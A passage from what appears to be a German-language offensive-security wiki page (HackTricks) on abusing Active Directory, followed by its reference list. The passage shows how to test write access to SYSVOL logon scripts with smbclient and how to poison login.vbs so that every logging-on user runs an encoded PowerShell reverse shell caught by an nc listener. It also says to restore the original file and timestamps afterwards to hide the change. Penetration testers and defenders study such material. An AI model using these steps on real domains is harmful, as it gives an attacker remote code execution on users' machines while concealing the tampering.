smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Wenn sich die Dateigröße oder die mtime ändert, verfügen Sie über Schreibrechte. Sichern Sie die Originaldateien vor Änderungen.

### Ein VBScript-Anmeldeskript für RCE vergiften
Fügen Sie einen Befehl hinzu, der eine PowerShell-Reverse-Shell startet (generieren Sie diese über revshells.com), und behalten Sie die ursprüngliche Logik bei, um die Geschäftsfunktion nicht zu beeinträchtigen:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Lausche auf deinem Host und warte auf die nächste interaktive Anmeldung:
```bash
rlwrap -cAr nc -lnvp 443
```
- Ausführung erfolgt unter dem Token des protokollierenden Benutzers (nicht SYSTEM). Der Geltungsbereich ist der GPO-Link (OU, Site, Domain), der dieses Script anwendet.
- Nach der Verwendung durch Wiederherstellen des ursprünglichen Inhalts und der ursprünglichen Zeitstempel bereinigen.


## References

- [1] [Missbrauch von Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegierte Konten und Token-Berechtigungen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Das Update zum ACL-Angriffspfad](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Berechtigungseskalation mit ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Nach Active Directory-Berechtigungen und privilegierten Konten suchen](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-Attribut-/UAC-Operationen unter Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (Gruppenmitgliedschaft)](https://www.samba.org/)
- [10] [HTB Puppy: Missbrauch von AD-ACLs, KeePassXC-Argon2-Cracking und DPAPI-Entschlüsselung bis zum DC-Administrator](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Hijacking von GPO-UNC-Pfaden für Code Execution und NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: Ausnutzung von Active Directory-GPOs durch NTLM Relaying und mehr](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU, ein Witz? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Ausnutzung versteckter ACL-Angriffsvektoren in Organizational Units von Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulation legitimer Active Directory-Dienste im Netzwerk: der Fall der GPO-Ausnutzung](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
